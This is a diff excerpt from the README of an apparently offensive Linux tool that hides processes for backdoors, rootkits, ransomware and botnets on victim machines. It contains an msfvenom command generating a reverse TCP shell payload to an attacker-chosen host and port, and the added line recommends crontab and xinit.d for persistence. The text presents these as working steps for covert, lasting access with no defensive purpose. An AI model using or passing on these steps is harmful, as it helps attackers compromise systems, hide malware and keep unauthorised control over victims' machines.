@@ -26,6 +26,7 @@ when backdoor already setup it will be ***hidden*** your spesisifc process,***un
 - **msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=IP LPORT=PORT -b "\x00" -f elf -o NAME_BACKDOOR**
 - for hidden process you can use for **rootkits,backdoor,ransom and botnet** { sh,python,perl,exe and binary }.
 - Victim  target all linux distribution include ( **base32** and **base64** in their system ) 
+- For get persistence you can use **crontab and xinit.d** into your backdoor  
 - this just simple algorithma how we can maintain our sessions and backdoor/rootkits , **you can explore this**
 
 
